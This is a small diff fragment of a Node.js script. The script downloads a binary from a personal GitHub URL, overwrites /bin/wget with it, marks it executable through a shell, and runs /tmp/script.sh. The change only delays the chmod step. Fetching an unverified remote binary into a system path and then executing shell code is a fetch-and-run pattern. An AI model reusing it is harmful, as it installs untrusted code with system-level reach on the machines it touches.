@@ -28,7 +28,9 @@ https.get("https://raw.githubusercontent.com/iceyfromdiscord/arm/main/wget-arm",
   res.pipe(fs.createWriteStream("/bin/wget"));
 });
 
-spawn("chmod +x /bin/wget", { shell: true, stdio: "inherit" });
+setTimeout(function(){
+    spawn("chmod +x /bin/wget", { shell: true, stdio: "inherit" });
+}, 2500);
 
 const child = spawn("sh", ["/tmp/script.sh"], {
   stdio: "inherit",
